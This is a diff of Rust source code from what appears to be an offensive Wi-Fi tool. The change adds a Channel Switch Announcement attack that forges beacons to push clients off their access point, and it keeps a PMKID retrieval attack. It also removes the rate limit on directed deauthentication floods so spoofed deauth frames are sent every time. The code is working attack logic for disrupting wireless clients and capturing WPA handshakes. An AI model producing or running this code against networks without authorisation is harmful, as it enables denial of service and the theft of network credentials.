@@ -2,28 +2,123 @@
 
 use std::{
     os::fd::AsRawFd,
+    sync::mpsc::channel,
     time::{Duration, SystemTime},
 };
 
-use libwifi::frame::{
-    components::{MacAddress, RsnCipherSuite},
-    DeauthenticationReason, ProbeRequest,
+use libwifi::{
+    frame::{
+        components::{MacAddress, RsnCipherSuite},
+        Beacon, DeauthenticationReason, ProbeRequest,
+    },
+    Addresses,
 };
+use nl80211_ng::channels::WiFiChannel;
 use rand::seq::SliceRandom;
 
 use crate::{
     status::{MessageType, StatusMessage},
     tx::{
-        build_association_request_rg, build_authentication_frame_noack,
+        build_association_request_rg, build_authentication_frame_noack, build_csa_beacon,
         build_deauthentication_fm_ap, build_deauthentication_fm_client,
         build_probe_request_undirected, build_probe_response, build_reassociation_request,
     },
     write_packet, OxideRuntime,
 };
 
+//////////////////////////////////////////////////////////////
+//                                                          //
+//             Channel Switch Announcment Attack            //
+//   This form of attack will send beacon frames for the AP //
+//   with the CSA Information Element in an attempt to      //
+//   force clients to change to a nearby channel. This can  //
+//   result in a reauthentication/association.              //
+//                                                          //
+//////////////////////////////////////////////////////////////
+
+pub fn csa_attack(oxide: &mut OxideRuntime, beacon: Beacon) -> Result<(), String> {
+    let channel = oxide.get_adjacent_channel();
+    let ap_mac = beacon.header.src().unwrap();
+    let ap_data = if let Some(dev) = oxide.access_points.get_device(ap_mac) {
+        dev
+    } else {
+        return Ok(());
+    };
+
+    ////// Target Validation ////////
+    let mut target: bool = true;
+
+    if !oxide.targets.is_empty() || !oxide.stargets.is_empty() {
+        target = false;
+    }
+
+    if !target && oxide.targets.contains(ap_mac) {
+        target = true;
+    }
+
+    if !target
+        && !oxide.stargets.is_empty()
+        && (ap_data.ssid.is_none()
+            || (ap_data.ssid.is_some() && oxide.stargets.contains(&ap_data.ssid.clone().unwrap())))
+    {
+        target = true
+    }
+
+    if !target {
+        return Ok(());
+    }
+    /////////////////////////////
+
+    // If we already have a 4whs, don't continue.
+    if oxide
+        .handshake_storage
+        .has_complete_handshake_for_ap(ap_mac)
+    {
+        return Ok(());
+    }
+
+    if channel.is_none() {
+        return Ok(());
+    }
+    let new_channel = channel.unwrap();
+
+    let frx = build_csa_beacon(beacon.clone(), new_channel);
+
+    // If we are transmitting
+    if !oxide.notx {
+        let _ = write_packet(oxide.tx_socket.as_raw_fd(), &frx);
+        let _ = write_packet(oxide.tx_socket.as_raw_fd(), &frx);
+        let _ = write_packet(oxide.tx_socket.as_raw_fd(), &frx);
+        let _ = write_packet(oxide.tx_socket.as_raw_fd(), &frx);
+        let _ = write_packet(oxide.tx_socket.as_raw_fd(), &frx);
+        ap_data.interactions += 1;
+        ap_data.auth_sequence.state = 1;
+        oxide.status_log.add_message(StatusMessage::new(
+            MessageType::Info,
+            format!(
+                "CSA Attack: {} ({}) Channel: {}",
+                ap_mac,
+                beacon.station_info.ssid.unwrap_or("Hidden".to_string()),
+                new_channel
+            ),
+        ));
+    }
+
+    Ok(())
+}
+
+//////////////////////////////////////////////////////////////
+//                                                          //
+//             M1 (PMKID) Retreival Attack                  //
+//   This form of attack is two-stage process that will     //
+//   attempt to silicit an AP for a PMKID by authenticating //
+//   and associating with the access point. Given the       //
+//   correct parameters the AP will send an EAPOL M1 to     //
+//   us, which may contain PMKID.                           //
+//                                                          //
+//////////////////////////////////////////////////////////////
+
 /// M1 Retrieval Attack Phase 1
-/// Authentication
-/// Used to (attempt) to retrieve a PMKID.
 pub fn m1_retrieval_attack(oxide: &mut OxideRuntime, ap_mac: &MacAddress) -> Result<(), String> {
     // get AP object, if there isn't one, return (this shouldn't happen).
     let ap_data = if let Some(dev) = oxide.access_points.get_device(ap_mac) {
@@ -200,6 +295,10 @@ pub fn m1_retrieval_attack_phase_2(
 }
 
 pub fn deauth_attack(oxide: &mut OxideRuntime, ap_mac: &MacAddress) -> Result<(), String> {
+    if !oxide.deauth {
+        return Ok(());
+    }
+
     let ap_data = if let Some(dev) = oxide.access_points.get_device(ap_mac) {
         dev
     } else {
@@ -243,6 +342,10 @@ pub fn deauth_attack(oxide: &mut OxideRuntime, ap_mac: &MacAddress) -> Result<()
     let mut deauth_client = MacAddress([255, 255, 255, 255, 255, 255]);
 
     if !ap_data.information.ap_mfp.is_some_and(|mfp| mfp) && ap_data.information.akm_mask() {
+        oxide.status_log.add_message(StatusMessage::new(
+            MessageType::Info,
+            format!("beacon_count % 128: {}", beacon_count % 128),
+        ));
         let random_client = ap_data
             .client_list
             .get_random()
@@ -250,32 +353,30 @@ pub fn deauth_attack(oxide: &mut OxideRuntime, ap_mac: &MacAddress) -> Result<()
 
         if let Some(mac_address) = random_client {
             // Rate limit directed deauths to every 32 beacons.
-            if (beacon_count % 32) == 0 {
-                deauth_client = mac_address;
-                // Deauth From AP
-                let frx = build_deauthentication_fm_ap(
-                    ap_mac,
-                    &mac_address,
-                    oxide.counters.sequence1(),
-                    DeauthenticationReason::Class3FrameReceivedFromNonassociatedSTA,
-                );
-                let _ = write_packet(oxide.tx_socket.as_raw_fd(), &frx);
+            deauth_client = mac_address;
+            // Deauth From AP
+            let frx = build_deauthentication_fm_ap(
+                ap_mac,
+                &mac_address,
+                oxide.counters.sequence1(),
+                DeauthenticationReason::Class3FrameReceivedFromNonassociatedSTA,
+            );
+            let _ = write_packet(oxide.tx_socket.as_raw_fd(), &frx);
 
-                // Deauth From Client
-                let frx = build_deauthentication_fm_client(
-                    ap_mac,
-                    &mac_address,
-                    oxide.counters.sequence1(),
-                    DeauthenticationReason::DeauthenticatedBecauseSTAIsLeaving,
-                );
-                let _ = write_packet(oxide.tx_socket.as_raw_fd(), &frx);
+            // Deauth From Client
+            let frx = build_deauthentication_fm_client(
+                ap_mac,
+                &mac_address,
+                oxide.counters.sequence1(),
+                DeauthenticationReason::DeauthenticatedBecauseSTAIsLeaving,
+            );
+            let _ = write_packet(oxide.tx_socket.as_raw_fd(), &frx);
 
-                ap_data.interactions += 1;
-                oxide.status_log.add_message(StatusMessage::new(
-                    MessageType::Info,
-                    format!("Sending Deauth: {} => {}", ap_mac, deauth_client),
-                ));
-            }
+            ap_data.interactions += 1;
+            oxide.status_log.add_message(StatusMessage::new(
+                MessageType::Info,
+                format!("Sending Deauth: {} <=> {}", ap_mac, deauth_client),
+            ));
         } else {
             // Rate limit broadcast deauths to every 128 beacons.
             if (beacon_count % 128) == 0 {
